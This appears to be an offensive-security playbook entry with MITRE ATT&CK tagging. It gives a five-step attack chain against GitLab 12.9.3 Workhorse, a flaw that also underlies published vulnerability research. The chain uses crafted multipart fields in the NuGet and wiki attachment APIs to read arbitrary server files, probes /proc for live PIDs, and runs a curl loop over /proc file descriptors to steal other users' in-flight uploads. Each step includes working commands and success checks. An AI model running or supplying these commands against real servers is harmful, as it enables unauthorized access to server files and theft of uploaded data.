---
tags:
  - gitlab
  - file-read
  - bypass
  - multipart
  - proc-fs
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/echo]]'
  - '[[tools/sudo]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/create-test-file-git-owned]]'
  - '[[commands/curl-nuget-upload-bypass]]'
  - '[[commands/create-test-file-root-owned]]'
  - '[[commands/curl-wiki-attachments-read]]'
  - '[[commands/curl-pid-validation-19601]]'
  - '[[commands/curl-pid-validation-19603]]'
  - '[[commands/loop-steal-inflight-files]]'
  - '[[commands/create-test-file-hello]]'
  - '[[commands/create-dummy-file-unused]]'
  - '[[commands/curl-group-import-pid-leak]]'
  - '[[commands/loop-probe-file-descriptors]]'
platforms:
  - Linux
  - Web
complexity: medium
procedures:
  - '[[procedures/Prepare-GitLab-Server-Test-Files]]'
  - '[[procedures/Exploit-NuGet-Package-Upload-for-File-Read-Bypass]]'
  - '[[procedures/Exploit-Wiki-Attachments-for-Arbitrary-File-Read]]'
  - '[[procedures/Discover-Valid-PID-via-Proc-Filesystem-Probing]]'
  - '[[procedures/Steal-In-Flight-Uploads-via-Proc-FD-Looping]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
description: >-
  Multi-stage attack exploiting a bypass in GitLab's Workhorse multipart
  middleware to read arbitrary files from allowed paths and steal in-flight
  uploads via /proc filesystem
skill_level: intermediate
impact_level: high
id: 24cea764-a540-48f3-8518-8a1e0c36e466
created_at: '2025-12-11T06:10:15.446Z'
updated_at: '2025-12-11T06:10:15.446Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0009]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1005]]'
---
# GitLab Workhorse Multipart Bypass for Arbitrary File Read and In-Flight Data Theft

## Overview

This attack chain demonstrates exploiting a vulnerability in GitLab's Workhorse component, allowing arbitrary file reads from allowed paths by bypassing multipart validation using specially crafted field names. It progresses from preparing test files to exploiting various APIs for file reads, PID discovery, and stealing in-flight uploads via /proc symlinks, potentially exposing sensitive server data.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Test Files] --> B[NuGet Bypass Exploit]
    B --> C[Wiki Attachments Exploit]
    C --> D[PID Discovery]
    D --> E[In-Flight Theft]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/echo]]
- [[tools/sudo]]

### Target Environment

- GitLab 12.9.3-ee on Ubuntu 18.04
- Required services: PostgreSQL 10.12, Redis 5.0.7, GitLab Shell 12.0.0
- Network access to GitLab API endpoints

### Initial Access Requirements

- Valid GitLab API token ($TOKEN)
- Access to a project (e.g., ID 171) with package and wiki permissions
- Server-side access for test file creation (simulated attacker control)

## Detailed Attack Procedures

## Step 1: Prepare Test Files - [[procedures/Prepare-GitLab-Server-Test-Files]]

### Objective

Create test files on the GitLab server to simulate readable targets, changing ownership to test permission bypasses.

### Instructions

Use [[commands/create-test-file-git-owned]] to prepare a git-owned file:

```bash
echo hello > /tmp/ggg; sudo chown git:git /tmp/ggg
```

Alternatively, for root-owned testing, use [[commands/create-test-file-root-owned]]:

```bash
echo hello > /tmp/ggg; sudo chown root:root /tmp/ggg
```

### Validation

Verify file existence and ownership with `ls -l /tmp/ggg`. Success if files are created without errors.

## Step 2: Exploit NuGet Bypass - [[procedures/Exploit-NuGet-Package-Upload-for-File-Read-Bypass]]

### Objective

Bypass validation in NuGet package uploads to read arbitrary files using crafted multipart fields.

### Instructions

Execute [[commands/curl-nuget-upload-bypass]] to read the test file:

```bash
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"
```

### Validation

Look for HTTP 201 Created response containing file contents. Success if target file is read.

## Step 3: Exploit Wiki Attachments - [[procedures/Exploit-Wiki-Attachments-for-Arbitrary-File-Read]]

### Objective

Use wiki attachments API to read files without ownership restrictions via similar bypass.

### Instructions

After preparing root-owned file, run [[commands/curl-wiki-attachments-read]]:

```bash
curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'
```

### Validation

Check for JSON response with file details. Success if file is attached and contents accessible.

## Step 4: Discover Valid PID - [[procedures/Discover-Valid-PID-via-Proc-Filesystem-Probing]]

### Objective

Probe /proc filesystem to find valid PIDs for further exploitation.

### Instructions

Test PIDs with [[commands/curl-pid-validation-19601]]:

```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

And [[commands/curl-pid-validation-19603]]:

```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

### Validation

Valid PID returns 201; invalid returns 500. Success if a valid PID is identified.

## Step 5: Steal In-Flight Uploads - [[procedures/Steal-In-Flight-Uploads-via-Proc-FD-Looping]]

### Objective

Loop to capture and steal in-flight upload files via identified PID and file descriptors.

### Instructions

Run the loop with [[commands/loop-steal-inflight-files]]:

```bash
while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt' | grep file_name; done
```

### Validation

Output shows stolen file names. Success if in-flight files are captured.

## Attack Chain Summary

### Key Achievements

1. Bypassed multipart validation to read arbitrary files.
2. Discovered PIDs via /proc probing.
3. Stole sensitive in-flight data.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Local System]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

*Last updated: [TIMESTAMP]*
